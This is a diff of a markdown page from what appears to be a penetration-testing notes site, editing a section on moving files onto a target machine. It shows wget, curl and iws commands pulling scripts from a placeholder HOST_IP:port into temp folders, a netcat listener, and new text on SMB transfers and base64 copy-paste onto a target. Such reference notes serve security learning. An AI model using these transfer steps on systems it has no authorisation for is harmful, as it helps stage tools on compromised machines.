@@ -204,10 +204,7 @@ PS> # Download on Windows
 PS> wget HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
 ```
 
-</div><div>
-
 * You may try with `python2`, and `python3` if `python` is unavailable.
-* You may use copy-paste if appropriate ✂️
 * You may have to use `curl` or `iws` (Windows-only) instead of `wget`
 
 ```shell!
@@ -215,6 +212,7 @@ $ curl HOST_IP:port/script.sh -o /tmp/script.sh
 PS> curl HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
 PS> iws HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
 ```
+</div><div>
 
 #### netcat 🐈
 
@@ -227,7 +225,13 @@ $ nc -lvp port > file.sh
 
 #### services 🕳️
 
-You may use FTP/SCP/NFS... if applicable.
+You may use FTP/SCP/NFS/SMB/... if applicable. For instance, you may set up a [SMB](/operating-systems/networking/protocols/smb.md) server on your machine,  and use Windows `copy`/`robocopy ` command to upload/download files.
+
+➡️ See also [impacket](/operating-systems/networking/protocols/tools/impacket.md)
+
+#### Copy-paste ✂️
+
+Copy-paste may be an option, but not every file can be copy-pasted. One trick is to encode the file using base64, copy-paste the base64 payload on a file on the target, and decode the file on the target.
 </div></div>
 
 <hr class="sep-both">
